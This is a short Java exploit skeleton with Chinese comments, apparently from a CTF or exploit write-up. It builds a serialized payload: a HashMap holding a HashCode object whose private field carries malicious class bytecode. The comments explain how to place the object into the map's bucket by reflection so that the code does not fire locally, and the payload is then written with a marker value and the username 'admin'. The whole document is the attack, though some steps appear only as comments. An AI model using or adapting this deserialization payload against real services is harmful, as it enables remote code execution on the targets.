public class Exp {
    public static void main(String[] args) {
        HashCode hc = new HashCode();
// 反射设置私有字段 ClassByte = 恶意类字节码

        HashMap map = new HashMap();
// 关键坑:不能直接 map.put(hc, x)——本地就会触发 hashCode 执行恶意代码!
// 正确做法:反射拿到 HashMap 内部 table,用反射创建的 Node 直接把 (hash, hc) 塞进桶里

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeLong(9143923155895290750L);  // marker
        oos.writeUTF("admin");                // 用户名
        oos.writeObject(map);                 // 恶意 HashMap

    }
}
